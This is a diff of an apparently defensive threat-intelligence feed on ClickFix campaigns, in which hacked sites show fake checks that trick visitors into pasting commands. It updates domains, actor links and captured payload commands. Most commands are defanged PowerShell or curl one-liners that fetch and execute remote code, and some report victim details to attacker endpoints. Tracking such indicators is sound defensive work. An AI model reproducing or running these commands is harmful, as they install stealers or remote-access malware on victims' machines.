@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 5750,
+ "count": 5749,
  "indicators": [
   {
    "indicator": "06services.it",
@@ -67421,15 +67421,16 @@
    "actor": "dprk",
    "actor_link": "linked",
    "commands": [
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=92d035ba-bb71-4807-9d2b-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.claritek.se%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-03T16%3A17%3A59.467Z\"\" -d \"\"lastShellAt=2026-11-03T16%3A17%3A59.467Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=ff93eba6-5510-4845-bfda-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.claritek.se%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-01T16%3A23%3A34.357Z\"\" -d \"\"lastShellAt=2026-11-01T16%3A23%3A34.357Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
+    "curl -sL -d \"id=de700010-4c02-417e-a4c1-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww.claritek.se%2F&os=Mac%2015&lastVisitAt=2026-11-22T08%3A04%3A21.681Z&lastShellAt=2026-11-22T08%3A04%3A21.681Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//claude-flare-verification[.]vercel[.]app/mac' -L | sh",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=b5e7eb04-a1b7-4f95-9f67-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.claritek.se%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-22T08%3A01%3A15.831Z\"\" -d \"\"lastShellAt=2026-11-22T08%3A01%3A15.831Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//claude-flare-verification[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
    ],
    "lure_from": [
-    "ncheck-brows.beer"
+    "ncheck-brows.beer",
+    "img-codes-cloude.info"
    ]
   },
   {
@@ -85866,12 +85867,14 @@
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//lepafonso[.]bz/proliv_dante/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')"
+    "(irm 'hxxps[:]//holodeo[.]net/saykatproliv1/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')"
    ],
    "connects_to": [
     "hagosuro.lc",
     "xorados.com",
     "trek-72.com",
+    "holodeo.net",
+    "j7tracker.gb.net",
     "lepafonso.bz",
     "t-trustresnew.com",
     "trustchecknes.com",
@@ -89305,6 +89308,8 @@
     "trek-72.com",
     "t-trustresnew.com",
     "lepafonso.bz",
+    "holodeo.net",
+    "j7tracker.gb.net",
     "trustchecknes.com",
     "t-trustrest.com"
    ],
@@ -92875,7 +92880,9 @@
     "fcdnbovres.cc",
     "govrobczxc.cc",
     "webrtwtre22.cc",
-    "webffoo002.cc"
+    "webffoo002.cc",
+    "tthcsslread21.cc",
+    "tlschssl22read.cc"
    ]
   },
   {
@@ -93090,8 +93097,8 @@
    "lure_from": [
     "fudcomcheck.art",
     "verifyidentrob01.cc",
-    "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "fcdnbovres.cc",
+    "govrobczxc.cc"
    ]
   },
   {
@@ -97545,8 +97552,8 @@
    ],
    "lure_from": [
     "fudcomcheck.art",
-    "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "fcdnbovres.cc",
+    "govrobczxc.cc"
    ]
   },
   {
@@ -97806,10 +97813,10 @@
     "lepafonso.bz"
    ],
    "lure_from": [
-    "verifyidentrob01.cc",
     "fudcomcheck.art",
-    "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "verifyidentrob01.cc",
+    "fcdnbovres.cc",
+    "govrobczxc.cc"
    ]
   },
   {
@@ -112323,56 +112330,6 @@
    ]
   },
   {
-   "indicator": "foerdermaterialien.ch",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-11-11",
-   "last_seen": "2026-11-12",
-   "last_online": "2026-11-22",
-   "offline_since": null,
-   "url": "https://foerdermaterialien.ch/",
-   "brand": null,
-   "product": null,
-   "hosting": "AS Zettaplan AG",
-   "dns": "hostfactory.ch",
-   "ip": "2a0e:f0c0:1:21::4:3238",
-   "asn": "AS200713",
-   "org": "FREY-AS Zettaplan AG, CH",
-   "country": "CH",
-   "ips": [
-    {
-     "ip": "2a0e:f0c0:1:21::4:3238",
-     "asn": "AS200713",
-     "org": "FREY-AS Zettaplan AG, CH",
-     "first_seen": "2026-11-11",
-     "last_seen": "2026-11-12"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "foerdermaterialien.ch",
-     "status": "online",
-     "first_seen": "2026-11-11",
-     "last_seen": "2026-11-12"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxps[:]//t-trustresnew[.]com/danteproliv1/[id]')|iex"
-   ],
-   "connects_to": [
-    "t-trustresnew.com"
-   ],
-   "lure_from": [
-    "interseq.at"
-   ]
-  },
-  {
    "indicator": "foerderverein-freibad-menne.de",
    "type": "domain",
    "category": "clickfix",
@@ -121401,11 +121358,12 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxps[:]//lepafonso[.]bz/dantestraff2929/[id]' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36' -Headers @{'X-WUA'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//t-trustresnew[.]com/danteproliv1/[id]')|iex",
-    "(irm 'hxxps[:]//trustchecknes[.]com/Girya/[id]')|iex"
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
+    "(irm 'hxxps[:]//t-trustresnew[.]com/danteproliv1/[id]')|iex"
    ],
    "connects_to": [
     "lepafonso.bz",
+    "j7tracker.gb.net",
     "t-trustresnew.com",
     "trustchecknes.com",
     "t-trustrest.com"
@@ -172527,8 +172485,8 @@
     "hagosuro.lc",
     "xorados.com",
     "trek-72.com",
-    "t-trustresnew.com",
     "lepafonso.bz",
+    "t-trustresnew.com",
     "trustchecknes.com",
     "t-trustrest.com"
    ],
@@ -285324,8 +285282,8 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=e00e4fd5-4235-48fe-8da5-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.tradecap.dk%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-22T08%3A01%3A15.125Z\"\" -d \"\"lastShellAt=2026-11-22T08%3A01%3A15.125Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//claude-flare-verification[.]vercel[.]app/win -L | cmd\"",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=077be8bc-fe96-465a-9f6f-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.tradecap.dk%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-03T15%3A33%3A49.394Z\"\" -d \"\"lastShellAt=2026-11-03T15%3A33%3A49.394Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
+    "curl -sL -d \"id=31fd7d6e-e87b-4546-9426-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww.tradecap.dk%2F&os=Mac%2015&lastVisitAt=2026-11-22T08%3A04%3A20.199Z&lastShellAt=2026-11-22T08%3A04%3A20.199Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//claude-flare-verification[.]vercel[.]app/mac' -L | sh",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=e00e4fd5-4235-48fe-8da5-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.tradecap.dk%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-22T08%3A01%3A15.125Z\"\" -d \"\"lastShellAt=2026-11-22T08%3A01%3A15.125Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//claude-flare-verification[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
@@ -285377,8 +285335,8 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=26e396ea-09eb-482e-a428-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.tradecap.se%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-22T08%3A01%3A12.877Z\"\" -d \"\"lastShellAt=2026-11-22T08%3A01%3A12.877Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//claude-flare-verification[.]vercel[.]app/win -L | cmd\"",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=1f557bc5-713a-474b-8cb9-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.tradecap.se%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-03T15%3A34%3A05.223Z\"\" -d \"\"lastShellAt=2026-11-03T15%3A34%3A05.223Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
+    "curl -sL -d \"id=a8ee430a-8107-4ddc-9aa9-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww.tradecap.se%2F&os=Mac%2015&lastVisitAt=2026-11-22T08%3A04%3A21.257Z&lastShellAt=2026-11-22T08%3A04%3A21.257Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//claude-flare-verification[.]vercel[.]app/mac' -L | sh",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=26e396ea-09eb-482e-a428-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.tradecap.se%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-22T08%3A01%3A12.877Z\"\" -d \"\"lastShellAt=2026-11-22T08%3A01%3A12.877Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//claude-flare-verification[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
